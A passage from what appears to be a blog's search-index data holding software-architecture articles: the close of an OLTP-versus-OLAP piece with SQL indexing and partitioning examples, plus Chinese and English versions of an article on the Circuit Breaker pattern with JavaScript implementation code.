this.bigquery.query(query); &#125; &#125; Performance Optimization OLTP Optimization -- Indexes for fast lookups CREATE INDEX idx_orders_customer ON orders(customer_id); CREATE INDEX idx_orders_status ON orders(status); CREATE INDEX idx_orders_created ON orders(created_at); -- Partitioning for large tables CREATE TABLE orders ( id INT, customer_id INT, created_at TIMESTAMP, ... ) PARTITION BY RANGE (YEAR(created_at)) ( PARTITION p2019 VALUES LESS THAN (2020), PARTITION p2020 VALUES LESS THAN (2021), PARTITION p2021 VALUES LESS THAN (2022) ); OLAP Optimization -- Columnar storage for analytics CREATE TABLE fact_sales ( sale_id BIGINT, date_key INT, customer_key INT, revenue DECIMAL(10,2), ... ) STORED AS PARQUET; -- Materialized views for common queries CREATE MATERIALIZED VIEW monthly_sales_summary AS SELECT DATE_TRUNC(&#39;month&#39;, sale_date) as month, product_category, SUM(revenue) as total_revenue, COUNT(*) as transaction_count FROM fact_sales GROUP BY 1, 2; -- Refresh periodically REFRESH MATERIALIZED VIEW monthly_sales_summary; Summary Understanding OLTP and OLAP is fundamental to designing effective data systems: OLTP Systems: Power daily operations with fast, reliable transactions Optimized for writes and simple reads Normalized schema ensures data integrity Real-time, current data OLAP Systems: Enable business intelligence and analytics Optimized for complex queries on large datasets Denormalized schema improves query performance Historical data for trend analysis Key Takeaway: Most organizations need both—OLTP for operations and OLAP for analytics. ETL processes bridge the two, moving data from transactional systems to analytical warehouses where it can be analyzed without impacting operational performance. 💡 Best PracticeNever run complex analytical queries directly on your OLTP database. Use ETL to move data to a dedicated OLAP system, protecting your operational database from performance degradation. References The Data Warehouse Toolkit by Ralph Kimball AWS: OLTP vs OLAP Google Cloud: Data Warehouse Concepts","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"en"},{"title":"断路器模式：防止连锁故障","slug":"2020/01/Circuit-Breaker-Pattern-zh-CN","date":"un11fin11","updated":"un55fin55","comments":true,"path":"/zh-CN/2020/01/Circuit-Breaker-Pattern/","permalink":"https://neo01.com/zh-CN/2020/01/Circuit-Breaker-Pattern/","excerpt":"了解断路器模式如何通过暂时阻挡对故障服务的调用来保护分布式系统免于连锁故障，让系统有时间恢复。","text":"想象你家中的电路系统。当过多电流流经电线时——可能是短路或插座过载——断路器会跳闸，切断电源以防止损坏或火灾。断路器不会持续尝试将电力强制通过危险的情况。相反地，它会快速失败，保护整个系统。问题修复后，你可以重置断路器并恢复供电。 同样的原理适用于分布式系统。当远程服务故障时，断路器模式可防止应用程序重复尝试注定失败的操作，保护系统资源并实现优雅降级。 电路断路器类比 就像电路断路器： 监控电流（请求失败） 超过阈值时跳闸（过多失败） 开启时阻挡进一步尝试（防止连锁故障） 冷却后允许测试（半开状态） 服务恢复时重置（关闭状态） 软件断路器： 监控服务调用失败 达到失败阈值时开启 开启时立即拒绝请求 超时后允许有限的测试请求 服务展现恢复时关闭 stateDiagram-v2 [*] --> Closed Closed --> Open: 达到失败阈值 Open --> HalfOpen: 超时到期 HalfOpen --> Closed: 达到成功阈值 HalfOpen --> Open: 发生任何失败 note right of Closed 正常运作 请求通过 计算失败次数 end note note right of Open 快速失败 请求被拒绝 计时器运行中 end note note right of HalfOpen 有限测试 允许试探请求 评估恢复状况 end note 问题：分布式系统中的连锁故障 在分布式环境中，远程服务调用可能因各种原因失败： 暂时性故障 &#x2F;&#x2F; 会自行解决的临时问题 class PaymentService &#123; async processPayment(orderId, amount) &#123; try &#123; &#x2F;&#x2F; 网络短暂中断 - 重试可能成功 return await this.paymentGateway.charge(amount); &#125; catch (error) &#123; if (error.code &#x3D;&#x3D;&#x3D; &#39;NETWORK_TIMEOUT&#39;) &#123; &#x2F;&#x2F; 暂时性 - 重试可能有效 return await this.retry(() &#x3D;&gt; this.paymentGateway.charge(amount) ); &#125; &#125; &#125; &#125; 持续性故障 &#x2F;&#x2F; 服务完全宕机 - 重试无济于事 class InventoryService &#123; async checkStock(productId) &#123; try &#123; return await this.inventoryApi.getStock(productId); &#125; catch (error) &#123; if (error.code &#x3D;&#x3D;&#x3D; &#39;SERVICE_UNAVAILABLE&#39;) &#123; &#x2F;&#x2F; 服务崩溃 - 重试浪费资源 &#x2F;&#x2F; 每次重试都会占用线程、内存、连接 &#x2F;&#x2F; 超时期间会阻挡其他操作 throw new Error(&#39;Inventory service unavailable&#39;); &#125; &#125; &#125; &#125; 资源耗尽 &#x2F;&#x2F; 失败的服务消耗关键资源 class OrderProcessor &#123; async processOrder(order) &#123; &#x2F;&#x2F; 每次失败的调用都会占用资源直到超时 const promises &#x3D; [ this.inventoryService.reserve(order.items), &#x2F;&#x2F; 30秒超时 this.paymentService.charge(order.total), &#x2F;&#x2F; 30秒超时 this.shippingService.schedule(order.address) &#x2F;&#x2F; 30秒超时 ]; try &#123; await Promise.all(promises); &#125; catch (error) &#123; &#x2F;&#x2F; 如果库存服务宕机： &#x2F;&#x2F; - 100个并发订单 &#x3D; 100个线程被阻挡 &#x2F;&#x2F; - 每个等待30秒超时 &#x2F;&#x2F; - 数据库连接被占用 &#x2F;&#x2F; - 待处理请求消耗内存 &#x2F;&#x2F; - 其他服务无法获取资源 &#125; &#125; &#125; ⚠️ 连锁故障问题初始故障：一个服务变慢或无法使用 资源阻塞：调用者等待超时，占用线程和连接 资源耗尽：系统耗尽线程、内存或连接 连锁影响：其他不相关的操作因资源匮乏而失败 全系统中断：整个应用程序变得无响应 解决方案：断路器模式 断路器作为代理监控失败并防止调用故障服务： class CircuitBreaker &#123; constructor(options &#x3D; &#123;&#125;) &#123; this.failureThreshold &#x3D; options.failureThreshold || 5; this.successThreshold &#x3D; options.successThreshold || 2; this.timeout &#x3D; options.timeout || 60000; &#x2F;&#x2F; 60秒 this.monitoringPeriod &#x3D; options.monitoringPeriod || 10000; &#x2F;&#x2F; 10秒 this.state &#x3D; &#39;CLOSED&#39;; this.failureCount &#x3D; 0; this.successCount &#x3D; 0; this.nextAttempt &#x3D; Date.now(); &#125; async execute(operation) &#123; if (this.state &#x3D;&#x3D;&#x3D; &#39;OPEN&#39;) &#123; if (Date.now() &lt; this.nextAttempt) &#123; throw new Error(&#39;Circuit breaker is OPEN&#39;); &#125; &#x2F;&#x2F; 超时到期，尝试半开 this.state &#x3D; &#39;HALF_OPEN&#39;; this.successCount &#x3D; 0; &#125; try &#123; const result &#x3D; await operation(); this.onSuccess(); return result; &#125; catch (error) &#123; this.onFailure(); throw error; &#125; &#125; onSuccess() &#123; this.failureCount &#x3D; 0; if (this.state &#x3D;&#x3D;&#x3D; &#39;HALF_OPEN&#39;) &#123; this.successCount++; if (this.successCount &gt;&#x3D; this.successThreshold) &#123; this.state &#x3D; &#39;CLOSED&#39;; console.log(&#39;断路器关闭 - 服务已恢复&#39;); &#125; &#125; &#125; onFailure() &#123; this.failureCount++; this.successCount &#x3D; 0; if (this.state &#x3D;&#x3D;&#x3D; &#39;HALF_OPEN&#39;) &#123; this.state &#x3D; &#39;OPEN&#39;; this.nextAttempt &#x3D; Date.now() + this.timeout; console.log(&#39;断路器开启 - 服务仍在故障中&#39;); &#125; if (this.state &#x3D;&#x3D;&#x3D; &#39;CLOSED&#39; &amp;&amp; this.failureCount &gt;&#x3D; this.failureThreshold) &#123; this.state &#x3D; &#39;OPEN&#39;; this.nextAttempt &#x3D; Date.now() + this.timeout; console.log(&#39;断路器开启 - 达到阈值&#39;); &#125; &#125; getState() &#123; return this.state; &#125; &#125; 断路器状态 graph TB subgraph Closed[\"🟢 关闭状态\"] C1[请求到达] C2[传递给服务] C3{成功？} C4[增加失败计数器] C5{达到阈值？} C6[返回结果] C1 --> C2 C2 --> C3 C3 -->|是| C6 C3 -->|否| C4 C4 --> C5 C5 -->|否| C6 end subgraph Open[\"🔴 开启状态\"] O1[请求到达] O2[立即失败] O3[返回缓存/默认值] O4{超时到期？} O1 --> O2 O2 --> O3 O3 --> O4 end subgraph HalfOpen[\"🟡 半开状态\"] H1[有限请求] H2[传递给服务] H3{成功？} H4[增加成功计数器] H5{成功阈值？} H1 --> H2 H2 --> H3 H3 -->|是| H4 H4 --> H5 end C5 -->|是| Open O4 -->|是| HalfOpen H5 -->|是| Closed H3 -->|否| Open style Closed fill:#d3f9d8,stroke:#2f9e44 style Open fill:#ffe3e3,stroke:#c92a2a style HalfOpen fill:#fff3bf,stroke:#f59f00 关闭状态：正常运作 class InventoryServiceClient &#123; constructor() &#123; this.circuitBreaker &#x3D; new CircuitBreaker(&#123; failureThreshold: 5, timeout: 60000 &#125;); &#125; async checkStock(productId) &#123; return await this.circuitBreaker.execute(async () &#x3D;&gt; &#123; &#x2F;&#x2F; 正常运作 - 请求通过 const response &#x3D; await fetch( &#96;https:&#x2F;&#x2F;inventory-api.example.com&#x2F;stock&#x2F;$&#123;productId&#125;&#96; ); if (!response.ok) &#123; throw new Error(&#96;HTTP $&#123;response.status&#125;&#96;); &#125; return await response.json(); &#125;); &#125; &#125; &#x2F;&#x2F; 使用方式 const client &#x3D; new InventoryServiceClient(); &#x2F;&#x2F; 前4次失败 - 断路器保持关闭 for (let i &#x3D; 0; i &lt; 4; i++) &#123; try &#123; await client.checkStock(&#39;product-123&#39;); &#125; catch (error) &#123; console.log(&#96;尝试 $&#123;i + 1&#125; 失败&#96;); &#125; &#125; &#x2F;&#x2F; 第5次失败 - 断路器开启 try &#123; await client.checkStock(&#39;product-123&#39;); &#125; catch (error) &#123; console.log(&#39;断路器开启&#39;); &#125; 开启状态：快速失败 class OrderService &#123; constructor() &#123; this.inventoryClient &#x3D; new InventoryServiceClient(); this.defaultStock &#x3D; &#123; available: false, quantity: 0 &#125;; &#125; async processOrder(order) &#123; try &#123; &#x2F;&#x2F; 断路器开启 - 立即失败 const stock &#x3D; await this.inventoryClient.checkStock(order.productId); return this.completeOrder(order, stock); &#125; catch (error) &#123; if (error.message &#x3D;&#x3D;&#x3D; &#39;Circuit breaker is OPEN&#39;) &#123; &#x2F;&#x2F; 优雅降级 console.log(&#39;库存服务无法使用，使用默认值&#39;); return this.completeOrder(order, this.defaultStock); &#125; throw error; &#125; &#125; completeOrder(order, stock) &#123; if (!stock.available) &#123; return &#123; status: &#39;PENDING&#39;, message: &#39;库存检查无法使用。订单将很快被验证。&#39; &#125;; &#125; return &#123; status: &#39;CONFIRMED&#39;, message: &#39;订单已确认&#39; &#125;; &#125; &#125; 半开状态：测试恢复 class CircuitBreakerWithHalfOpen extends CircuitBreaker &#123; async execute(operation) &#123; if (this.state &#x3D;&#x3D;&#x3D; &#39;OPEN&#39;) &#123; if (Date.now() &lt; this.nextAttempt) &#123; throw new Error(&#39;Circuit breaker is OPEN&#39;); &#125; &#x2F;&#x2F; 进入半开状态 this.state &#x3D; &#39;HALF_OPEN&#39;; this.successCount &#x3D; 0; console.log(&#39;断路器半开 - 测试服务&#39;); &#125; if (this.state &#x3D;&#x3D;&#x3D; &#39;HALF_OPEN&#39;) &#123; &#x2F;&#x2F; 在半开状态限制并发请求 if (this.pendingRequests &gt;&#x3D; 3) &#123; throw new Error(&#39;Circuit breaker is HALF_OPEN - limiting requests&#39;); &#125; &#125; try &#123; this.pendingRequests++; const result &#x3D; await operation(); this.onSuccess(); return result; &#125; catch (error) &#123; this.onFailure(); throw error; &#125; finally &#123; this.pendingRequests--; &#125; &#125; &#125; 实际实现 这是一个生产就绪的断路器，具有监控功能： class ProductionCircuitBreaker &#123; constructor(serviceName, options &#x3D; &#123;&#125;) &#123; this.serviceName &#x3D; serviceName; this.failureThreshold &#x3D; options.failureThreshold || 5; this.successThreshold &#x3D; options.successThreshold || 2; this.timeout &#x3D; options.timeout || 60000; this.monitoringPeriod &#x3D; options.monitoringPeriod || 10000; this.state &#x3D; &#39;CLOSED&#39;; this.failureCount &#x3D; 0; this.successCount &#x3D; 0; this.nextAttempt &#x3D; Date.now(); this.lastStateChange &#x3D; Date.now(); &#x2F;&#x2F; 指标 this.metrics &#x3D; &#123; totalRequests: 0, successfulRequests: 0, failedRequests: 0, rejectedRequests: 0 &#125;; &#x2F;&#x2F; 定期重置失败计数 this.resetInterval &#x3D; setInterval(() &#x3D;&gt; &#123; if (this.state &#x3D;&#x3D;&#x3D; &#39;CLOSED&#39;) &#123; this.failureCount &#x3D; 0; &#125; &#125;, this.monitoringPeriod); &#125; async execute(operation, fallback &#x3D; null) &#123; this.metrics.totalRequests++; if (this.state &#x3D;&#x3D;&#x3D; &#39;OPEN&#39;) &#123; if (Date.now() &lt; this.nextAttempt) &#123; this.metrics.rejectedRequests++; if (fallback) &#123; return await fallback(); &#125; throw new CircuitBreakerOpenError( &#96;Circuit breaker is OPEN for $&#123;this.serviceName&#125;&#96; ); &#125; this.transitionTo(&#39;HALF_OPEN&#39;); &#125; try &#123; const result &#x3D; await operation(); this.onSuccess(); this.metrics.successfulRequests++; return result; &#125; catch (error) &#123; this.onFailure(error); this.metrics.failedRequests++; if (fallback &amp;&amp; this.state &#x3D;&#x3D;&#x3D; &#39;OPEN&#39;) &#123; return await fallback(); &#125; throw error; &#125; &#125; onSuccess() &#123; this.failureCount &#x3D; 0; if (this.state &#x3D;&#x3D;&#x3D; &#39;HALF_OPEN&#39;) &#123; this.successCount++; if (this.successCount &gt;&#x3D; this.successThreshold) &#123; this.transitionTo(&#39;CLOSED&#39;); &#125; &#125; &#125; onFailure(error) &#123; this.failureCount++; this.successCount &#x3D; 0; if (this.state &#x3D;&#x3D;&#x3D; &#39;HALF_OPEN&#39;) &#123; this.transitionTo(&#39;OPEN&#39;); &#125; else if (this.state &#x3D;&#x3D;&#x3D; &#39;CLOSED&#39; &amp;&amp; this.failureCount &gt;&#x3D; this.failureThreshold) &#123; this.transitionTo(&#39;OPEN&#39;); &#125; this.logError(error); &#125; transitionTo(newState) &#123; const oldState &#x3D; this.state; this.state &#x3D; newState; this.lastStateChange &#x3D; Date.now(); if (newState &#x3D;&#x3D;&#x3D; &#39;OPEN&#39;) &#123; this.nextAttempt &#x3D; Date.now() + this.timeout; &#125; this.emitStateChange(oldState, newState); &#125; emitStateChange(oldState, newState) &#123; console.log( &#96;[$&#123;this.serviceName&#125;] 断路器：$&#123;oldState&#125; → $&#123;newState&#125;&#96; ); &#x2F;&#x2F; 发送指标供监控 this.publishMetrics(&#123; service: this.serviceName, state: newState, timestamp: Date.now(), metrics: this.metrics &#125;); &#125; logError(error) &#123; console.error( &#96;[$&#123;this.serviceName&#125;] 请求失败：&#96;, error.message ); &#125; publishMetrics(data) &#123; &#x2F;&#x2F; 发送到监控系统 &#x2F;&#x2F; 示例：CloudWatch、Prometheus、Datadog &#125; getMetrics() &#123; return &#123; ...this.metrics, state: this.state, failureCount: this.failureCount, successCount: this.successCount &#125;; &#125; destroy() &#123; clearInterval(this.resetInterval); &#125; &#125; class CircuitBreakerOpenError extends Error &#123; constructor(message) &#123; super(message); this.name &#x3D; &#39;CircuitBreakerOpenError&#39;; &#125; &#125; 真实世界示例：电子商务平台 class RecommendationService &#123; constructor() &#123; this.circuitBreaker &#x3D; new ProductionCircuitBreaker( &#39;recommendation-service&#39;, &#123; failureThreshold: 5, successThreshold: 3, timeout: 30000 &#125; ); this.cache &#x3D; new Map(); &#125; async getRecommendations(userId) &#123; const fallback &#x3D; async () &#x3D;&gt; &#123; &#x2F;&#x2F; 返回缓存的推荐 if (this.cache.has(userId)) &#123; return &#123; recommendations: this.cache.get(userId), source: &#39;cache&#39; &#125;; &#125; &#x2F;&#x2F; 返回热门商品作为备用 return &#123; recommendations: await this.getPopularItems(), source: &#39;fallback&#39; &#125;; &#125;; return await this.circuitBreaker.execute( async () &#x3D;&gt; &#123; const response &#x3D; await fetch( &#96;https:&#x2F;&#x2F;recommendations-api.example.com&#x2F;users&#x2F;$&#123;userId&#125;&#96; ); if (!response.ok) &#123; throw new Error(&#96;HTTP $&#123;response.status&#125;&#96;); &#125; const data &#x3D; await response.json(); &#x2F;&#x2F; 成功时更新缓存 this.cache.set(userId, data.recommendations); return &#123; recommendations: data.recommendations, source: &#39;live&#39; &#125;; &#125;, fallback ); &#125; async getPopularItems() &#123; &#x2F;&#x2F; 返回静态热门商品 return [ &#123; id: &#39;item-1&#39;, name: &#39;热门商品 1&#39; &#125;, &#123; id: &#39;item-2&#39;, name: &#39;热门商品 2&#39; &#125;, &#123; id: &#39;item-3&#39;, name: &#39;热门商品 3&#39; &#125; ]; &#125; &#125; &#x2F;&#x2F; 使用方式 const recommendationService &#x3D; new RecommendationService(); async function displayRecommendations(userId) &#123; try &#123; const result &#x3D; await recommendationService.getRecommendations(userId); if (result.source &#x3D;&#x3D;&#x3D; &#39;cache&#39;) &#123; console.log(&#39;显示缓存的推荐&#39;); &#125; else if (result.source &#x3D;&#x3D;&#x3D; &#39;fallback&#39;) &#123; console.log(&#39;显示热门商品（服务无法使用）&#39;); &#125; else &#123; console.log(&#39;显示个性化推荐&#39;); &#125; return result.recommendations; &#125; catch (error) &#123; console.error(&#39;无法获取推荐：&#39;, error); return []; &#125; &#125; 断路器与重试模式结合 结合断路器与重试以处理暂时性故障： class ResilientServiceClient &#123; constructor(serviceName) &#123; this.circuitBreaker &#x3D; new ProductionCircuitBreaker(serviceName, &#123; failureThreshold: 3, timeout: 60000 &#125;); &#125; async callWithRetry(operation, maxRetries &#x3D; 3) &#123; return await this.circuitBreaker.execute(async () &#x3D;&gt; &#123; let lastError; for (let attempt &#x3D; 1; attempt &lt;&#x3D; maxRetries; attempt++) &#123; try &#123; return await operation(); &#125; catch (error) &#123; lastError &#x3D; error; &#x2F;&#x2F; 某些错误不重试 if (this.isNonRetryableError(error)) &#123; throw error; &#125; if (attempt &lt; maxRetries) &#123; &#x2F;&#x2F; 指数退避 const delay &#x3D; Math.min(1000 * Math.pow(2, attempt - 1), 10000); await this.sleep(delay); &#125; &#125; &#125; throw lastError; &#125;); &#125; isNonRetryableError(error) &#123; &#x2F;&#x2F; 不重试客户端错误（4xx） return error.status &gt;&#x3D; 400 &amp;&amp; error.status &lt; 500; &#125; sleep(ms) &#123; return new Promise(resolve &#x3D;&gt; setTimeout(resolve, ms)); &#125; &#125; 监控与指标 (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_f5b6d687f')); var option = { \"title\": { \"text\": \"断路器状态随时间变化\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"请求\", \"失败\", \"断路器状态\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"10:00\", \"10:05\", \"10:10\", \"10:15\", \"10:20\", \"10:25\", \"10:30\"] }, \"yAxis\": [ { \"type\": \"value\", \"name\": \"请求数\" }, { \"type\": \"value\", \"name\": \"状态\", \"max\": 2, \"axisLabel\": { \"formatter\": function(value) { return [\"关闭\", \"半开\", \"开启\"][value] || \"\"; } } } ], \"series\": [ { \"name\": \"请求\", \"type\": \"line\", \"data\": [100, 95, 90, 20, 25, 80, 100] }, { \"name\": \"失败\", \"type\": \"line\", \"data\": [2, 5, 15, 18, 10, 3, 1] }, { \"name\": \"断路器状态\", \"type\": \"line\", \"yAxisIndex\": 1, \"data\": [0, 0, 2, 2, 1, 0, 0], \"itemStyle\": { \"color\": \"#f59f00\" } } ] }; chart.setOption(option); } })(); 关键考量 💡 异常处理应用程序必须优雅地处理断路器异常： 提供备用响应 显示用户友好的消息 记录以供监控和警报 💡 超时配置平衡超时时间与恢复模式： 太短：服务恢复前断路器重新开启 太长：用户不必要地等待 根据历史数据使用自适应超时 ⚠️ 监控至关重要跟踪断路器指标： 状态转换（关闭 → 开启 → 半开） 请求成功/失败率 在每个状态花费的时间 断路器频繁开启时发出警报 💡 备用策略断路器开启时提供有意义的备用： 缓存数据 默认值 降级功能 用户通知 何时使用断路器 使用此模式当： ✅ 防止连锁故障：阻止故障在服务间扩散 ✅ 保护共享资源：防止故障依赖性造成资源耗尽 ✅ 优雅降级：服务故障时维持部分功能 ✅ 快速失败：避免在已知故障上等待超时 不要使用此模式当： ❌ 本地资源：内存内操作不需要断路器 ❌ 业务逻辑异常：用于基础设施故障，而非业务规则 ❌ 简单重试就足够：快速恢复的暂时性故障 ❌ 消息队列：死信队列能更好地处理故障 与重试模式比较 方面 断路器 重试模式 目的 防止调用故障服务 从暂时性故障恢复 何时使用 持续性故障 临时故障 行为 达到阈值后快速失败 持续尝试并延迟 资源使用 最小（立即拒绝） 较高（等待重试） 恢复检测 主动（半开测试） 被动（重试成功） 💡 最佳实践：结合两种模式在断路器内使用重试模式： 断路器包装操作 重试处理暂时性故障 断路器防止过度重试 系统获得两种方法的优点 总结 断路器模式对于构建弹性分布式系统至关重要： 防止连锁故障通过停止对故障服务的调用 保护系统资源免于在中断期间耗尽 实现优雅降级通过备用响应 提供快速失败而非等待超时 监控服务健康并自动检测恢复 就像电路断路器保护你的家一样，这个模式保护你的分布式系统免受故障依赖性造成的损害。它不是为了防止故障——而是为了优雅地失败并快速恢复。 参考资料 Microsoft Azure Architecture Patterns - Circuit Breaker Martin Fowler - CircuitBreaker Release It! by Michael Nygard","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"zh-CN"},{"title":"Circuit Breaker Pattern: Preventing Cascading Failures","slug":"2020/01/Circuit-Breaker-Pattern","date":"un11fin11","updated":"un55fin55","comments":true,"path":"2020/01/Circuit-Breaker-Pattern/","permalink":"https://neo01.com/2020/01/Circuit-Breaker-Pattern/","excerpt":"Learn how the Circuit Breaker pattern protects distributed systems from cascading failures by temporarily blocking calls to failing services, allowing time for recovery.","text":"Imagine an electrical circuit in your home. When too much current flows through a wire—perhaps from a short circuit or overloaded outlet—the circuit breaker trips, cutting power to prevent damage or fire. The breaker doesn’t keep trying to force electricity through a dangerous situation. Instead, it fails fast, protecting the entire system. After the problem is fixed, you can reset the breaker and restore power. This same principle applies to distributed systems. When a remote service fails, the Circuit Breaker pattern prevents your application from repeatedly attempting doomed operations, protecting system resources and enabling graceful degradation. The Electrical Circuit Analogy Just like an electrical circuit breaker: Monitors current flow (request failures) Trips when threshold is exceeded (too many failures) Blocks further attempts while open (prevents cascading failures) Allows testing after cooldown (half-open state) Resets when service recovers (closed state) A software circuit breaker: Monitors service call failures Opens when failure threshold is reached Rejects requests immediately while open Permits limited test requests after timeout Closes when service demonstrates recovery stateDiagram-v2 [*] --> Closed Closed --> Open: Failure threshold reached Open --> HalfOpen: Timeout expires HalfOpen --> Closed: Success threshold reached HalfOpen --> Open: Any failure occurs note right of Closed Normal operation Requests pass through Failures counted end note note right of Open Fast failure Requests rejected Timer running end note note right of HalfOpen Limited testing Trial requests allowed Evaluating recovery end note Problem: Cascading Failures in Distributed Systems In distributed environments, remote service calls can fail for various reasons: Transient Faults &#x2F;&#x2F; Temporary issues that resolve themselves class PaymentService &#123; async processPayment(orderId, amount) &#123; try &#123; &#x2F;&#x2F; Network hiccup - retry might succeed return await this.paymentGateway.charge(amount); &#125; catch (error) &#123; if (error.code &#x3D;&#x3D;&#x3D; &#39;NETWORK_TIMEOUT&#39;) &#123; &#x2F;&#x2F; Transient - might work on retry return await this.retry(() &#x3D;&gt; this.paymentGateway.charge(amount) ); &#125; &#125; &#125; &#125; Persistent Failures &#x2F;&#x2F; Service completely down - retries won&#39;t help class InventoryService &#123; async checkStock(productId) &#123; try &#123; return await this.inventoryApi.getStock(productId); &#125; catch (error) &#123; if (error.code &#x3D;&#x3D;&#x3D; &#39;SERVICE_UNAVAILABLE&#39;) &#123; &#x2F;&#x2F; Service crashed - retrying wastes resources &#x2F;&#x2F; Each retry holds threads, memory, connections &#x2F;&#x2F; Timeout period blocks other operations throw new Error(&#39;Inventory service unavailable&#39;); &#125; &#125; &#125; &#125; Resource Exhaustion &#x2F;&#x2F; Failing service consumes critical resources class OrderProcessor &#123; async processOrder(order) &#123; &#x2F;&#x2F; Each failed call holds resources until timeout const promises &#x3D; [ this.inventoryService.reserve(order.items), &#x2F;&#x2F; 30s timeout this.paymentService.charge(order.total), &#x2F;&#x2F; 30s timeout this.shippingService.schedule(order.address) &#x2F;&#x2F; 30s timeout ]; try &#123; await Promise.all(promises); &#125; catch (error) &#123; &#x2F;&#x2F; If inventory service is down: &#x2F;&#x2F; - 100 concurrent orders &#x3D; 100 threads blocked &#x2F;&#x2F; - Each waiting 30 seconds for timeout &#x2F;&#x2F; - Database connections held &#x2F;&#x2F; - Memory consumed by pending requests &#x2F;&#x2F; - Other services can&#39;t get resources &#125; &#125; &#125; ⚠️ The Cascading Failure ProblemInitial failure: One service becomes slow or unavailable Resource blocking: Callers wait for timeouts, holding threads and connections Resource exhaustion: System runs out of threads, memory, or connections Cascading impact: Other unrelated operations fail due to resource starvation System-wide outage: Entire application becomes unresponsive Solution: Circuit Breaker Pattern The Circuit Breaker acts as a proxy that monitors failures and prevents calls to failing services: class CircuitBreaker &#123; constructor(options &#x3D; &#123;&#125;) &#123; this.failureThreshold &#x3D; options.failureThreshold || 5; this.successThreshold &#x3D; options.successThreshold || 2; this.timeout &#x3D; options.timeout || 60000; &#x2F;&#x2F; 60 seconds this.monitoringPeriod &#x3D; options.monitoringPeriod || 10000; &#x2F;&#x2F; 10 seconds this.state &#x3D; &#39;CLOSED&#39;; this.failureCount &#x3D; 0; this.successCount &#x3D; 0; this.nextAttempt &#x3D; Date.now(); &#125; async execute(operation) &#123; if (this.state &#x3D;&#x3D;&#x3D; &#39;OPEN&#39;) &#123; if (Date.now() &lt; this.nextAttempt) &#123; throw new Error(&#39;Circuit breaker is OPEN&#39;); &#125; &#x2F;&#x2F; Timeout expired, try half-open this.state &#x3D; &#39;HALF_OPEN&#39;; this.successCount &#x3D; 0; &#125; try &#123; const result &#x3D; await operation(); this.onSuccess(); return result; &#125; catch (error) &#123; this.onFailure(); throw error; &#125; &#125; onSuccess() &#123; this.failureCount &#x3D; 0; if (this.state &#x3D;&#x3D;&#x3D; &#39;HALF_OPEN&#39;) &#123; this.successCount++; if (this.successCount &gt;&#x3D; this.successThreshold) &#123; this.state &#x3D; &#39;CLOSED&#39;; console.log(&#39;Circuit breaker CLOSED - service recovered&#39;); &#125; &#125; &#125; onFailure() &#123; this.failureCount++; this.successCount &#x3D; 0; if (this.state &#x3D;&#x3D;&#x3D; &#39;HALF_OPEN&#39;) &#123; this.state &#x3D; &#39;OPEN&#39;; this.nextAttempt &#x3D; Date.now() + this.timeout; console.log(&#39;Circuit breaker OPEN - service still failing&#39;); &#125; if (this.state &#x3D;&#x3D;&#x3D; &#39;CLOSED&#39; &amp;&amp; this.failureCount &gt;&#x3D; this.failureThreshold) &#123; this.state &#x3D; &#39;OPEN&#39;; this.nextAttempt &#x3D; Date.now() + this.timeout; console.log(&#39;Circuit breaker OPEN - threshold reached&#39;); &#125; &#125; getState() &#123; return this.state; &#125; &#125; Circuit Breaker States graph TB subgraph Closed[\"🟢 CLOSED State\"] C1[Request arrives] C2[Pass to service] C3{Success?} C4[Increment failure counter] C5{Thresholdreached?} C6[Return result] C1 --> C2 C2 --> C3 C3 -->|Yes| C6 C3 -->|No| C4 C4 --> C5 C5 -->|No| C6 end subgraph Open[\"🔴 OPEN State\"] O1[Request arrives] O2[Fail immediately] O3[Return cached/default] O4{Timeoutexpired?} O1 --> O2 O2 --> O3 O3 --> O4 end subgraph HalfOpen[\"🟡 HALF-OPEN State\"] H1[Limited requests] H2[Pass to service] H3{Success?} H4[Increment success counter] H5{Successthreshold?} H1 --> H2 H2 --> H3 H3 -->|Yes| H4 H4 --> H5 end C5 -->|Yes| Open O4 -->|Yes| HalfOpen H5 -->|Yes| Closed H3 -->|No| Open style Closed fill:#d3f9d8,stroke:#2f9e44 style Open fill:#ffe3e3,stroke:#c92a2a style HalfOpen fill:#fff3bf,stroke:#f59f00 Closed State: Normal Operation class InventoryServiceClient &#123; constructor() &#123; this.circuitBreaker &#x3D; new CircuitBreaker(&#123; failureThreshold: 5, timeout: 60000 &#125;); &#125; async checkStock(productId) &#123; return await this.circuitBreaker.execute(async () &#x3D;&gt; &#123; &#x2F;&#x2F; Normal operation - requests pass through const response &#x3D; await fetch( &#96;https:&#x2F;&#x2F;inventory-api.example.com&#x2F;stock&#x2F;$&#123;productId&#125;&#96; ); if (!response.ok) &#123; throw new Error(&#96;HTTP $&#123;response.status&#125;&#96;); &#125; return await response.json(); &#125;); &#125; &#125; &#x2F;&#x2F; Usage const client &#x3D; new InventoryServiceClient(); &#x2F;&#x2F; First 4 failures - circuit stays closed for (let i &#x3D; 0; i &lt; 4; i++) &#123; try &#123; await client.checkStock(&#39;product-123&#39;); &#125; catch (error) &#123; console.log(&#96;Attempt $&#123;i + 1&#125; failed&#96;); &#125; &#125; &#x2F;&#x2F; 5th failure - circuit opens try &#123; await client.checkStock(&#39;product-123&#39;); &#125; catch (error) &#123; console.log(&#39;Circuit breaker OPEN&#39;); &#125; Open State: Fast Failure class OrderService &#123; constructor() &#123; this.inventoryClient &#x3D; new InventoryServiceClient(); this.defaultStock &#x3D; &#123; available: false, quantity: 0 &#125;; &#125; async processOrder(order) &#123; try &#123; &#x2F;&#x2F; Circuit is open - fails immediately const stock &#x3D; await this.inventoryClient.checkStock(order.productId); return this.completeOrder(order, stock); &#125; catch (error) &#123; if (error.message &#x3D;&#x3D;&#x3D; &#39;Circuit breaker is OPEN&#39;) &#123; &#x2F;&#x2F; Graceful degradation console.log(&#39;Inventory service unavailable, using default&#39;); return this.completeOrder(order, this.defaultStock); &#125; throw error; &#125; &#125; completeOrder(order, stock) &#123; if (!stock.available) &#123; return &#123; status: &#39;PENDING&#39;, message: &#39;Inventory check unavailable. Order will be verified shortly.&#39; &#125;; &#125; return &#123; status: &#39;CONFIRMED&#39;, message: &#39;Order confirmed&#39; &#125;; &#125; &#125; Half-Open State: Testing Recovery class CircuitBreakerWithHalfOpen extends CircuitBreaker &#123; async 